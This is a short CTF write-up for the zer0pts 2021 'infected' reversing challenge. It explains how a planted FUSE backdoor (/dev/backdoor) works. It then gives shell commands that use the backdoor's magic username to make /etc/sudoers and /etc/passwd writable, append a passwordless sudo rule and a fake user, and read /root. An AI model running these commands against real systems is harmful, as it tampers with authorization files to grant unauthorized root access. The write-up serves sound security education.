# zer0pts CTF 2021, infected, rev

## Description
The backdoor is installed on this machine.
How can I use it to get the flag in /root directory?

## Solution
We have network interface and we can interact with it. Binary is using filesystem in user space (fuse). We can send a command to /dev/backdoor and it will change permissions of specified file. Command format is:   `username:file:permissions`. Username has to be `b4ckd00r` (knowledge from reversed binary). Connect to the server, run these commands:
```
echo "b4ckd00r:/etc/sudoers:0438" > /dev/backdoor
echo "b4ckd00r:/etc/passwd:0438" > /dev/backdoor
echo "januszek    ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
echo "januszek:x:1000:1000:test:/home/test:/bin/sh" >> /etc/passwd
echo "b4ckd00r:/etc/sudoers:288" > /dev/backdoor
sudo /bin/ls /root
```
and get the flag 

